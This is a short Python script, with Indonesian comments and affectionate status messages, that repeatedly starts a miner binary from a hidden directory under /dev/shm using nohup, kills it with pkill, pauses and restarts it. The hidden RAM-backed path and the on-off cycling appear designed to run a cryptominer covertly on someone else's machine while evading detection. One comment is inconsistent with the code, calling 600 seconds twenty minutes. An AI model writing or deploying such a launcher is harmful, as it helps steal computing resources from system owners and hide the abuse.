import os
import time
import sys

# CONFIG
MINER_PATH = "/dev/shm/.cache/tobrut"  # Lokasi miner
MINING_TIME = 600  # 20 menit
REST_TIME = 600  # 10 menit
LOG_PATH = "/dev/shm/.cache/logs/sayangku.log"

def kill_miner():
    print("💔 Mesin udah capek, aku kill langsung tanpa pikir panjang sayang...")
    os.system("pkill -f tobrut")
    sys.stdout.flush()

def start_miner():
    print("🚀 Menjalankan Panen buat rumah kita di Bali...")
    os.system(f"nohup {MINER_PATH} > {LOG_PATH} 2>&1 &")
    sys.stdout.flush()

def main():
    while True:
        print("⛏️ Panen selama 20 menit buat modal nikah kita...")
        start_miner()
        time.sleep(MINING_TIME)

        print("💔 Mesin udah capek, aku kill ya sayang...")
        kill_miner()

        print("😴 Istirahat dulu 10 menit biar hash kita fresh...")
        time.sleep(REST_TIME)

if __name__ == "__main__":
    print("💓 Cinta Abadi v6 Jalan Sayangku... 💕")
    sys.stdout.flush()
    main()
